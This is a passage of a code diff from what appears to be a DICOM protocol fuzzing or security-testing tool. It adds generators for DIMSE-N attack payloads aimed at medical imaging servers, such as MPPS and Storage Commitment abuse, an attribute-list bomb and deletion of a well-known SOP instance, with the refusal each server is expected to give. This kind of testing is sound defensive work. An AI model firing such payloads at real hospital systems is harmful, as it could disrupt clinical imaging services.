+                        'SOP Instance 1.2.840.10008.1.20.1.1',
+            expected_behavior='SCP must refuse to delete a standard well-known '
+                              'SOP instance',
+            metadata=_dimse_n_metadata(
+                'Storage Commitment', 'N-DELETE-RQ', steps=steps,
+                bug_class='well-known-instance-deletion',
+                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
+        )
+
+    @staticmethod
+    def _unavailable(name: str) -> AttackResult:
+        """Placeholder when scapy is absent - DIMSE-N needs the packet layer."""
+        return AttackResult(
+            name=f'dimse_n_{name}_unavailable',
+            category='dimse_n',
+            payload=b'\x04\x00\x00\x00\x00\x00',
+            description=f'{name} requires scapy for DIMSE-N command encoding',
+            expected_behavior='Install scapy to generate this payload',
+            metadata={'scapy_required': True, 'delivery': 'dicom-sequence'},
+        )
+
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield every DIMSE-N normalized-service attack payload."""
+        yield cls.mpps_ncreate_dataset_flag_without_data()
+        yield cls.mpps_nset_unknown_instance()
+        yield cls.mpps_nset_reopen_completed_step()
+        yield cls.mpps_nset_final_state_undefined_value()
+        yield cls.mpps_ncreate_duplicate_instance()
+        yield cls.storage_commitment_naction_unstored_instances()
+        yield cls.storage_commitment_naction_invalid_action_type()
+        yield cls.storage_commitment_unsolicited_event_report()
+        yield cls.storage_commitment_event_report_invalid_event_type()
+        yield cls.n_get_attribute_list_bomb()
+        yield cls.n_delete_well_known_instance()
 
 
 class CVEAttacks:
